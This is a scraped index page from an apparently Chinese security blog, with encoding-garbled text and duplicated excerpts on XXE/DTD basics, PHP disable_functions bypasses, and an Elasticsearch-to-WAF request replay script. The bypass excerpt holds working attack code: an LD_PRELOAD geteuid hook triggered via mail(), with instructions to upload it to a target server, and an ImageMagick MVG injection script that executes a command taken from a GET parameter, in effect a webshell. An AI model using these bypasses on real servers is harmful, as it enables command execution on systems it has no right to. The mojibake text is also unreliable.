<p>DTD(document type definitions)å¯ä»¥å®šä¹‰ä¸€ä¸ªåˆæ³•çš„XMLæ–‡æ¡£æ„å»ºæ¨¡å—ï¼Œå¯ä»¥è¢«æˆè¡Œå£°æ˜äºXMLæ–‡æ¡£ä¸­ï¼Œä¹Ÿå¯ä»¥ä½œä¸ºä¸€ä¸ªå¤–éƒ¨å¼•ç”¨ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">å†…éƒ¨å£°æ˜DTDï¼š

&lt;!DOCTYPE è·Ÿå…ƒç´  [å…ƒç´ å£°æ˜ï¼½&gt;

å¼•ç”¨å¤–éƒ¨DTD:

&lt;!DOCTYPE æ ¹å…ƒç´   SYSTEM &quot;æ–‡ä»¶å&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>DTDæ–‡æ¡£ä¸­å¾ˆå¤šå…³é”®å­—å¦‚ä¸‹: </p>
<ul>
<li>DOCTYPE(DTDçš„å£°æ˜ï¼‰</li>
<li>ENTITY ï¼ˆå®ä½“çš„å£°æ˜ï¼‰</li>
<li>SYSTEMã€PUBLIC ï¼ˆå¤–éƒ¨èµ„æºç”³è¯·ï¼‰ </li>
</ul>
<p>###å®ä½“</p>
<p>å®ä½“å¯ä»¥ç†è§£ä¸ºå˜é‡ï¼Œå¿…é¡»åœ¨DTDå®šä¹‰å£°æ˜ï¼Œå¯ä»¥åœ¨æ–‡æ¡£ä¸­çš„å…¶å®ƒä½ç½®å¼•ç”¨è¯¥å˜é‡çš„å€¼ã€‚<br>å®ä½“æŒ‰ç±»å‹ä¸»è¦åˆ†ä»¥ä¸‹å››ç§:</p>
<ul>
<li>å†…ç½®å®ä½“ï¼ˆBuilt-in entities)</li>
<li>å­—ç¬¦å®ä½“ï¼ˆCharacter entities)</li>
<li>é€šç”¨å®ä½“ï¼ˆGeneral entitiesï¼‰</li>
<li>å‚æ•°å®ä½“ (Parameter entitiesï¼‰</li>
</ul>
	

	</div>
  <a type="button" href="/2018/02/02/xxe.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>XMLåŸºç¡€ï¼š</p>
<p>XMLæ–‡æ¡£ç»“æ„ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">XMLå£°æ˜
&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;

DTDæ–‡æ¡£ç±»å‹å®šä¹‰
&lt;!DOCTYPE note [  &lt;!--å®šä¹‰æ­¤æ–‡æ¡£æ˜¯ note ç±»å‹çš„æ–‡æ¡£--&gt;
&lt;!ELEMENT note (to,from,heading,body)&gt;  &lt;!--å®šä¹‰noteå…ƒç´ æœ‰å››ä¸ªå…ƒç´ --&gt;
&lt;!ELEMENT to (#PCDATA)&gt;     &lt;!--å®šä¹‰toå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;
&lt;!ELEMENT from (#PCDATA)&gt;   &lt;!--å®šä¹‰fromå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;
&lt;!ELEMENT head (#PCDATA)&gt;   &lt;!--å®šä¹‰headå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;
&lt;!ELEMENT body (#PCDATA)&gt;   &lt;!--å®šä¹‰bodyå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;
]]]


æ–‡æ¡£å…ƒç´ 
&lt;note&gt;
&lt;to&gt;Dave&lt;&#x2F;to&gt;
&lt;from&gt;Tom&lt;&#x2F;from&gt;
&lt;head&gt;Reminder&lt;&#x2F;head&gt;
&lt;body&gt;You are a good man&lt;&#x2F;body&gt;
&lt;&#x2F;note&gt;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>DTD(document type definitions)å¯ä»¥å®šä¹‰ä¸€ä¸ªåˆæ³•çš„XMLæ–‡æ¡£æ„å»ºæ¨¡å—ï¼Œå¯ä»¥è¢«æˆè¡Œå£°æ˜äºXMLæ–‡æ¡£ä¸­ï¼Œä¹Ÿå¯ä»¥ä½œä¸ºä¸€ä¸ªå¤–éƒ¨å¼•ç”¨ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">å†…éƒ¨å£°æ˜DTDï¼š

&lt;!DOCTYPE è·Ÿå…ƒç´  [å…ƒç´ å£°æ˜ï¼½&gt;

å¼•ç”¨å¤–éƒ¨DTD:

&lt;!DOCTYPE æ ¹å…ƒç´   SYSTEM &quot;æ–‡ä»¶å&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>DTDæ–‡æ¡£ä¸­å¾ˆå¤šå…³é”®å­—å¦‚ä¸‹: </p>
<ul>
<li>DOCTYPE(DTDçš„å£°æ˜ï¼‰</li>
<li>ENTITY ï¼ˆå®ä½“çš„å£°æ˜ï¼‰</li>
<li>SYSTEMã€PUBLIC ï¼ˆå¤–éƒ¨èµ„æºç”³è¯·ï¼‰ </li>
</ul>
<p>###å®ä½“</p>
<p>å®ä½“å¯ä»¥ç†è§£ä¸ºå˜é‡ï¼Œå¿…é¡»åœ¨DTDå®šä¹‰å£°æ˜ï¼Œå¯ä»¥åœ¨æ–‡æ¡£ä¸­çš„å…¶å®ƒä½ç½®å¼•ç”¨è¯¥å˜é‡çš„å€¼ã€‚<br>å®ä½“æŒ‰ç±»å‹ä¸»è¦åˆ†ä»¥ä¸‹å››ç§:</p>
<ul>
<li>å†…ç½®å®ä½“ï¼ˆBuilt-in entities)</li>
<li>å­—ç¬¦å®ä½“ï¼ˆCharacter entities)</li>
<li>é€šç”¨å®ä½“ï¼ˆGeneral entitiesï¼‰</li>
<li>å‚æ•°å®ä½“ (Parameter entitiesï¼‰</li>
</ul>
	
	</div>
  <a type="button" href="/2018/02/02/xxe.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/12/12/bypass-disabled-functions.html" >bypass disable functions</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-12-12  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://threathunter.org/topic/596d90d5dff9e14c40b61986">https://threathunter.org/topic/596d90d5dff9e14c40b61986</a></p>
<pre class="line-numbers language-none"><code class="language-none">#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
void payload() &#123;
system(&quot;echo aaaaa&gt; &#x2F;tmp&#x2F;abc.txt&quot;);
&#125;
int geteuid() &#123;
if (getenv(&quot;LD_PRELOAD&quot;) &#x3D;&#x3D; NULL) &#123; return 0; &#125; 
unsetenv(&quot;LD_PRELOAD&quot;);
payload();
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">&lt;?php 
putenv(&quot;LD_PRELOAD&#x3D;&#x2F;var&#x2F;www&#x2F;hack.so&quot;);
mail(&quot;a[@localhost](&#x2F;user&#x2F;localhost)&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p> ä½¿ç”¨æ–¹æ³•ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">gcc -c -fPIC hack.c -o hack
gcc -shared hack -o hack.so<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>ä¿®æ”¹hack.cæ–‡ä»¶é‡Œé¢çš„å†…å®¹å³å¯æ‰§è¡Œå‘½ä»¤ï¼Œç»è¿‡æµ‹è¯•åœ¨lnmpä¸€é”®å®‰è£…åŒ…å¯ä»¥é¡ºåˆ©æ‰§è¡Œã€‚<br>åœ¨gccç¼–è¯‘çš„æ—¶å€™å¯ä»¥æ”¾åœ¨å…¶ä»–linuxä¸Šé¢ç¼–è¯‘ï¼Œå¥½äº†ä¹‹åä¸Šä¼ åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚</p>
<p>====<br>2018.8.22:</p>
<p>ä½¿ç”¨imageMagick ç»•è¿‡:</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;?php
echo &quot;Disable Functions: &quot; . ini_get(&#39;disable_functions&#39;) . &quot;\n&quot;;

$command &#x3D; PHP_SAPI &#x3D;&#x3D; &#39;cli&#39; ? $argv[1] : $_GET[&#39;cmd&#39;];
if ($command &#x3D;&#x3D; &#39;&#39;) &#123;
    $command &#x3D; &#39;id&#39;;
&#125;

$exploit &#x3D; &lt;&lt;&lt;EOF
push graphic-context
viewbox 0 0 640 480
fill &#39;url(https:&#x2F;&#x2F;example.com&#x2F;image.jpg&quot;|$command&quot;)&#39;
pop graphic-context
EOF;

file_put_contents(&quot;KKKK.mvg&quot;, $exploit);
$thumb &#x3D; new Imagick();
$thumb-&gt;readImage(&#39;KKKK.mvg&#39;);
$thumb-&gt;writeImage(&#39;KKKK.png&#39;);
$thumb-&gt;clear();
$thumb-&gt;destroy();
unlink(&quot;KKKK.mvg&quot;);
unlink(&quot;KKKK.png&quot;);
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä¸Šé¢çš„æ¯”è¾ƒè€ï¼Œæœ€æ–°çš„imagemagicæ¼æ´:</p>
	

	</div>
  <a type="button" href="/2017/12/12/bypass-disabled-functions.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://threathunter.org/topic/596d90d5dff9e14c40b61986">https://threathunter.org/topic/596d90d5dff9e14c40b61986</a></p>
<pre class="line-numbers language-none"><code class="language-none">#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
void payload() &#123;
system(&quot;echo aaaaa&gt; &#x2F;tmp&#x2F;abc.txt&quot;);
&#125;
int geteuid() &#123;
if (getenv(&quot;LD_PRELOAD&quot;) &#x3D;&#x3D; NULL) &#123; return 0; &#125; 
unsetenv(&quot;LD_PRELOAD&quot;);
payload();
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">&lt;?php 
putenv(&quot;LD_PRELOAD&#x3D;&#x2F;var&#x2F;www&#x2F;hack.so&quot;);
mail(&quot;a[@localhost](&#x2F;user&#x2F;localhost)&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p> ä½¿ç”¨æ–¹æ³•ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">gcc -c -fPIC hack.c -o hack
gcc -shared hack -o hack.so<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>ä¿®æ”¹hack.cæ–‡ä»¶é‡Œé¢çš„å†…å®¹å³å¯æ‰§è¡Œå‘½ä»¤ï¼Œç»è¿‡æµ‹è¯•åœ¨lnmpä¸€é”®å®‰è£…åŒ…å¯ä»¥é¡ºåˆ©æ‰§è¡Œã€‚<br>åœ¨gccç¼–è¯‘çš„æ—¶å€™å¯ä»¥æ”¾åœ¨å…¶ä»–linuxä¸Šé¢ç¼–è¯‘ï¼Œå¥½äº†ä¹‹åä¸Šä¼ åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚</p>
<p>====<br>2018.8.22:</p>
<p>ä½¿ç”¨imageMagick ç»•è¿‡:</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;?php
echo &quot;Disable Functions: &quot; . ini_get(&#39;disable_functions&#39;) . &quot;\n&quot;;

$command &#x3D; PHP_SAPI &#x3D;&#x3D; &#39;cli&#39; ? $argv[1] : $_GET[&#39;cmd&#39;];
if ($command &#x3D;&#x3D; &#39;&#39;) &#123;
    $command &#x3D; &#39;id&#39;;
&#125;

$exploit &#x3D; &lt;&lt;&lt;EOF
push graphic-context
viewbox 0 0 640 480
fill &#39;url(https:&#x2F;&#x2F;example.com&#x2F;image.jpg&quot;|$command&quot;)&#39;
pop graphic-context
EOF;

file_put_contents(&quot;KKKK.mvg&quot;, $exploit);
$thumb &#x3D; new Imagick();
$thumb-&gt;readImage(&#39;KKKK.mvg&#39;);
$thumb-&gt;writeImage(&#39;KKKK.png&#39;);
$thumb-&gt;clear();
$thumb-&gt;destroy();
unlink(&quot;KKKK.mvg&quot;);
unlink(&quot;KKKK.png&quot;);
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä¸Šé¢çš„æ¯”è¾ƒè€ï¼Œæœ€æ–°çš„imagemagicæ¼æ´:</p>
	
	</div>
  <a type="button" href="/2017/12/12/bypass-disabled-functions.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/12/11/producer-consumer.html" >ç”Ÿäº§è€…æ¶ˆè´¹è€…æ¨¡å‹</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-12-11  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>ä»£ç æ‰æ€¥,å…ˆçœ‹ä¾‹å­:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>http<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>jianshu<span class="token punctuation">.</span>com<span class="token operator">/</span>p<span class="token operator">/</span>d85a4329d0c2<span class="token operator">></span>
<span class="token comment">#!/usr/bin/env python</span>
<span class="token comment"># -*- coding: utf-8 -*-</span>

<span class="token keyword">import</span> threading
<span class="token keyword">import</span> Queue
<span class="token keyword">import</span> random
<span class="token keyword">import</span> time


<span class="token keyword">class</span> <span class="token class-name">Producter</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""ç”Ÿäº§è€…çº¿ç¨‹"""</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> t_name<span class="token punctuation">,</span> queue<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>queue <span class="token operator">=</span> queue
        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token operator">=</span>t_name<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            randomnum <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span>
            self<span class="token punctuation">.</span>queue<span class="token punctuation">.</span>put<span class="token punctuation">(</span>randomnum<span class="token punctuation">)</span>
            <span class="token keyword">print</span> <span class="token string">'put num in Queue %s'</span> <span class="token operator">%</span>  randomnum
            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

        <span class="token keyword">print</span> <span class="token string">'put queue done'</span>


<span class="token keyword">class</span> <span class="token class-name">ConsumeEven</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""å¥‡æ•°æ¶ˆè´¹çº¿ç¨‹"""</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> t_name<span class="token punctuation">,</span> queue<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>queue <span class="token operator">=</span> queue
        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token operator">=</span>t_name<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                queue_val <span class="token operator">=</span> self<span class="token punctuation">.</span>queue<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>
            <span class="token keyword">except</span> Exception<span class="token punctuation">,</span> e<span class="token punctuation">:</span>
                <span class="token keyword">print</span> e
                <span class="token keyword">break</span><span class="token punctuation">;</span>

            <span class="token keyword">if</span> queue_val <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span> <span class="token string">'Get Even Num %s '</span> <span class="token operator">%</span> queue_val
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>queue<span class="token punctuation">.</span>put<span class="token punctuation">(</span>queue_val<span class="token punctuation">)</span>


q <span class="token operator">=</span> Queue<span class="token punctuation">.</span>Queue<span class="token punctuation">(</span><span class="token punctuation">)</span>
pt <span class="token operator">=</span> Producter<span class="token punctuation">(</span><span class="token string">'producter'</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span>
ce <span class="token operator">=</span> ConsumeEven<span class="token punctuation">(</span><span class="token string">'consumeeven'</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span>
ce<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
pt<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
pt<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>
ce<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç…§ç€å†™:</p>
<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python
# coding: utf-8

from elasticsearch import Elasticsearch
import requests
from Queue import Queue
import time
import threading
import datetime

es &#x3D; Elasticsearch(&#39;xxxxxx:9200&#39;, http_auth&#x3D;(&#39;user&#39;, &#39;password&#39;))


class Producter(threading.Thread):
	def __init__(self, queue):
		threading.Thread.__init__(self)
		self.queue &#x3D; queue
		self.initime &#x3D; datetime.datetime.now().strftime(&#39;%Y.%m.%d&#39;)


	def initsearch(self):
		dsl_query &#x3D; &#123;
		  &quot;query&quot;: &#123;
		    &quot;match&quot;: &#123;
		      &quot;method&quot;: &#123;
		        &quot;query&quot;: &quot;GET&quot;,
		        &quot;type&quot;: &quot;phrase&quot;
		      &#125;
		    &#125;
		  &#125;,
			&quot;size&quot;: 100,
		&quot;sort&quot;: [&#123;&quot;@timestamp&quot;: &#123;&quot;order&quot;: &quot;desc&quot;&#125;&#125;]
		&#125;
		res &#x3D; es.search(index&#x3D;&quot;packetbeat-&quot; + self.initime, body&#x3D;dsl_query)
		latest_time &#x3D; res[&#39;hits&#39;][&#39;hits&#39;][0][&#39;_source&#39;][&#39;@timestamp&#39;]
		return latest_time


	def run(self):
		latest_time &#x3D; self.initsearch()
		while 1:
			lastindex &#x3D; latest_time.split(&#39;T&#39;)[0].replace(&#39;-&#39;, &#39;.&#39;)  # è·å–æœ€æ–°çš„index
			dsl_query2 &#x3D; &#123;
				&quot;query&quot;: &#123;
					&quot;bool&quot;: &#123;
						&quot;must&quot;: &#123;
							&quot;match&quot;: &#123;
								&quot;method&quot;: &quot;GET&quot;
							&#125;
						&#125;,
						&quot;filter&quot;: &#123;
							&quot;range&quot;: &#123;
								&quot;@timestamp&quot;: &#123;
									&quot;gte&quot;: latest_time
								&#125;
							&#125;
						&#125;
					&#125;
				&#125;,
				&quot;sort&quot;: [&#123;&quot;@timestamp&quot;: &#123;&quot;order&quot;: &quot;desc&quot;&#125;&#125;],
				&quot;size&quot;: 1000
			&#125;
			time.sleep(10)
			res2 &#x3D; es.search(index&#x3D;&quot;packetbeat-&quot; + lastindex, body&#x3D;dsl_query2)
			for hit in res2[&#39;hits&#39;][&#39;hits&#39;]:
				# print hit[&#39;_source&#39;][&#39;@timestamp&#39;], hit[&#39;_id&#39;], hit[&#39;_source&#39;][&#39;path&#39;]
				self.queue.put([hit[&#39;_source&#39;][&#39;path&#39;], hit[&#39;_source&#39;][&#39;http&#39;][&#39;request&#39;][&#39;params&#39;], hit[&#39;_source&#39;][&#39;method&#39;]])
				print &quot;Put %s&quot; % hit[&#39;_id&#39;]
				print hit[&#39;_source&#39;][&#39;@timestamp&#39;]
			latest_time &#x3D; res2[&#39;hits&#39;][&#39;hits&#39;][0][&#39;_source&#39;][&#39;@timestamp&#39;]


class Consumer(threading.Thread):
	def __init__(self, queue):
		threading.Thread.__init__(self)
		self.queue &#x3D; queue

	#
	# def http_curl(self):
	# 	# http_client &#x3D; AsyncHTTPClient()
	# 	path &#x3D; self.request[0]
	# 	param &#x3D; self.request[1]
	# 	method &#x3D; self.request[2]
	# 	if method &#x3D;&#x3D; &quot;GET&quot;:
	# 		##åˆ¤æ–­getçš„paramæ˜¯å¦æ˜¯ç©º
	# 		if not param:
	# 			pass
	# 		else:
	# 			rep &#x3D; requests.get(&quot;http:&#x2F;&#x2F;xxxxxx:9999&quot; + path + &#39;?&#39; + param + &quot;union select&quot;)
	# 			print &quot;Curl %s&quot; % self.request
	# 			print rep.status_code
	# 	else:
	# 		#ç•™ç€å†™POSTè¯·æ±‚åˆ¤æ–­
	# 		pass


	def run(self):
		while 1:
			try:
				request &#x3D; self.queue.get()
				path &#x3D; request[0]
				param &#x3D; request[1]
				method &#x3D; request[2]
				if method &#x3D;&#x3D; &#39;GET&#39;:
					if not param:
						pass
					else:
						rep &#x3D; requests.get(&quot;http:&#x2F;&#x2F;xxxxx:9999&quot; + path + &#39;?&#39; + param + &quot;union select&quot;)
				#else  å†™POST
				print &quot;Get %s&quot; % request
				print rep.status_code
			except Exception as e:
				raise e

q &#x3D; Queue()
pt &#x3D; Producter(q)
ce &#x3D; Consumer(q)
ce.start()
pt.start()
pt.join()
ce.join()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä»£ç åº”è¯¥è¿˜æœ‰ç‚¹é—®é¢˜ï¼Œå…ˆè®°å½•ä¸‹å¤§æ¦‚çš„æµç¨‹ï¼š</p>
<p>ä½¿ç”¨: <code>packetbeat</code>åœ¨AæœåŠ¡å™¨æŠ“åŒ…ï¼Œæ ¼å¼åŒ–ä¹‹åæŠŠæ•°æ®å‘é€åˆ°BæœåŠ¡å™¨ï¼Œå­˜å‚¨åœ¨elké‡Œé¢ï¼Œç„¶åBæœåŠ¡å™¨ç”»å›¾å¯¹è¿™äº›è¯·æ±‚è¿›è¡Œåˆ†æï¼Œæ¯”å¦‚æŸä¸ªæ¥å£æŠ¥è­¦ä¹‹ç±»çš„ã€‚</p>
<p>è¿™ä¸ªæ—¶å€™åœ¨BæœåŠ¡å™¨è®¾ç½®ä¸€ä¸ªnaxsié˜²ç«å¢™ä»£ç†ï¼Œç„¶åæŠŠesé‡Œé¢çš„è¾“å‡ºå–å‡ºæ¥ï¼Œå†å‘é€ä¸€éç»™Bã€‚ç»è¿‡æµ‹è¯•ï¼Œè™½ç„¶è¿™æ ·å­è¯·æ±‚å¤§éƒ¨åˆ†éƒ½æ˜¯404ï¼Œä½†æ˜¯å¦‚æœè¯·æ±‚ä¸­å­˜åœ¨æ¶æ„payloadï¼Œé˜²ç«å¢™ä¼šè®°å½•æ—¥å¿—ã€‚ï¼ˆæ‰€ä»¥è¿™é‡Œçš„è§„åˆ™è¦è®¾ç½®çš„ç‰¹åˆ«ä¸¥æ ¼ï¼Œä¸¥æ ¼åˆ°æ¯ä¸ªè¯·æ±‚éƒ½ä¸æ”¾è¿‡ï¼‰</p>
<p>ä¸Šé¢çš„è„šæœ¬å°±æ˜¯åœ¨Bé˜²ç«å¢™çš„è½¬å‘è„šæœ¬demoï¼Œæµ‹è¯•ä¸ºGETè¯·æ±‚ï¼Œå› ä¸ºPOSTè¯·æ±‚çš„bodyæ²¡æœ‰å­˜å‚¨åˆ°esé‡Œé¢ï¼Œè„šæœ¬çš„å¤§æ¦‚æ€è·¯æ˜¯è¿™æ ·çš„ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">å› ä¸ºesé‡Œé¢å­˜å‚¨çš„æ•°æ®åŒ…æ˜¯è¿™æ ·çš„æ ¼å¼: packet-[year]-[days]
æ‰€ä»¥å…ˆå¾—åˆ°ä»Šå¤©çš„æ—¥æœŸï¼Œéšä¾¿é€‰100æ¡ï¼Œè®°å½•æœ€æ–°çš„æ—¶é—´æˆ³ï¼Œæ­¤æ—¶åˆå§‹åŒ–å®Œæˆã€‚

ä¸‹é¢çš„è¯·æ±‚éƒ½æ˜¯åŸºäºè¿™ä¸ªæ—¶é—´æˆ³æ¥çš„ï¼Œæ¯éš”10sï¼Œåœ¨è¿™ä¸ªæ—¶é—´æˆ³çš„åŸºç¡€ä¸Šï¼Œè½®è¯¢è¯·æ±‚ä¸€æ¬¡esï¼Œç„¶åç»„è£…èµ·æ¥å‘é€åˆ°BæœåŠ¡å™¨ã€‚
è®°å½•ä¸‹æ¯æ¬¡è¯·æ±‚çš„æœ€æ–°æ—¥æœŸï¼Œç„¶åè¯·æ±‚è¿™ä¸ªindexï¼Œå› ä¸ºpacketçš„æ ¼å¼: packet-[year]-[days],æ‰€ä»¥è®°å½•ä¸‹æ¯æ¬¡è¯·æ±‚çš„æœ€æ–°æ—¶é—´ï¼Œæ ¼å¼åŒ–æŠ“å–æœ€æ–°çš„æ—¶é—´:

latest_time &#x3D; res2[&#39;hits&#39;][&#39;hits&#39;][0][&#39;_source&#39;][&#39;@timestamp&#39;]

å½“esçš„å­˜å‚¨æ•°æ®æŒ‰ç…§å¤§äºæŸä¸ªæ—¶é—´ç‚¹å»ç­›é€‰çš„æ—¶å€™ï¼Œåªä¼šå‡ºç°åŒ¹é…çš„æ—¶é—´æ¡æ•°ï¼Œæ‰€ä»¥å¯ä»¥æŠŠè¯·æ±‚çš„sizeè®¾ç½®å¾—å¤§ä¸€ç‚¹
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æš‚æ—¶çš„é—®é¢˜ï¼š</p>
	

	</div>
  <a type="button" href="/2017/12/11/producer-consumer.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>ä»£ç æ‰æ€¥,å…ˆçœ‹ä¾‹å­:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>http<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>jianshu<span class="token punctuation">.</span>com<span class="token operator">/</span>p<span class="token operator">/</span>d85a4329d0c2<span class="token operator">></span>
<span class="token comment">#!/usr/bin/env python</span>
<span class="token comment"># -*- coding: utf-8 -*-</span>

<span class="token keyword">import</span> threading
<span class="token keyword">import</span> Queue
<span class="token keyword">import</span> random
<span class="token keyword">import</span> time


<span class="token keyword">class</span> <span class="token class-name">Producter</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>
